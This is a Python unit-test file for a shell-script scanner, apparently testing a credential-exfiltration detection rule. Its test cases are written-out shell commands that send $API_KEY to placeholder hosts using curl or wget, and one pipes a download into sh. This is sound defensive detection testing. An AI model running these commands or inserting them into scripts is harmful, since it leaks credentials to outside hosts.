"""Bounded independent request evidence; unknown compounds keep prior behavior."""
import unittest
from test_qindun_certify import MODULE
scan = MODULE._shell_flow_findings
frames = MODULE.shell_compound_requests

CASES = [
    ("pipe", "curl --data \"$API_KEY\" https://example.invalid | cat", [[1,"confirmed"]]),
    ("sequence", "curl --data \"$API_KEY\" https://example.invalid; echo done", [[1,"confirmed"]]),
    ("second_request", "echo ready; curl --data \"$API_KEY\" https://example.invalid", [[1,"confirmed"]]),
    ("auth", "curl -H \"Authorization: Bearer $API_KEY\" https://example.invalid | cat", [[1,"candidate"]]),
    ("auth_body", "curl -H \"Authorization: Bearer $API_KEY\" https://example.invalid; curl --data \"$API_KEY\" https://other.invalid", [[1,"confirmed"]]),
    ("literal", "curl --data '$API_KEY' https://example.invalid | cat", []),
    ("escaped", "curl --data \"\\$API_KEY\" https://example.invalid; echo done", []),
    ("comment", "curl https://example.invalid # ; curl --data \"$API_KEY\" https://other.invalid", []),
    ("quoted_command", "echo 'curl --data \"$API_KEY\" https://example.invalid'; echo done", []),
    ("quoted_separator", "curl --data \"prefix;|$API_KEY\" https://example.invalid | cat", [[1,"confirmed"]]),
    ("public", "API_KEY=public\ncurl --data \"$API_KEY\" https://example.invalid | cat", []),
    ("known", "KEY=\"$API_KEY\"\ncurl --data \"$KEY\" https://example.invalid | cat", [[2,"confirmed"]]),
    ("mixed", "curl -H \"Authorization: Bearer $API_KEY\" https://example.invalid | cat\ncurl --data \"$API_KEY\" https://other.invalid", [[1,"candidate"],[2,"confirmed"]]),
    ("wget", "wget --post-data=\"$API_KEY\" https://example.invalid | cat", [[1,"confirmed"]]),
    ("unknown_preserved", "KEY=\"$API_KEY\"\ncurl --data \"$KEY\" https://example.invalid > /tmp/result", [[2,"confirmed"]]),
    ("literal_semicolon", "echo 'ready; curl --data \"$API_KEY\" https://example.invalid' | cat", []),
]


class ShellCompoundRequestTests(unittest.TestCase):
    def test_compound_requests(self):
        for name, source, expected in CASES:
            with self.subTest(name=name):
                hits = scan("main.sh", source)
                actual = sorted([h.line, h.disposition] for h in hits
                                if h.rule_id == "QINDUN.D3.CREDENTIAL_EXFILTRATION")
                self.assertEqual(actual, expected)

    def test_unknown_frames_defer(self):
        for source in [
            "KEY=public; curl --data \"$KEY\" https://example.invalid",
            "unset API_KEY; curl --data \"$API_KEY\" https://example.invalid",
            "printf -v API_KEY public; curl --data \"$API_KEY\" https://example.invalid",
            "curl --data \"$(read_key)\" https://example.invalid | cat",
            "curl --data \"$API_KEY\" https://example.invalid > /tmp/result; echo done",
            "curl --data \"$API_KEY\" https://example.invalid | sh",
            "echo done; echo done; echo done; echo done; echo done; echo done; echo done; echo done; echo done; echo done; echo done; echo done; echo done; echo done; echo done; echo done; echo done; echo done; curl --data \"$API_KEY\" https://example.invalid",
        ]:
            with self.subTest(source=source):
                self.assertIsNone(frames(source))
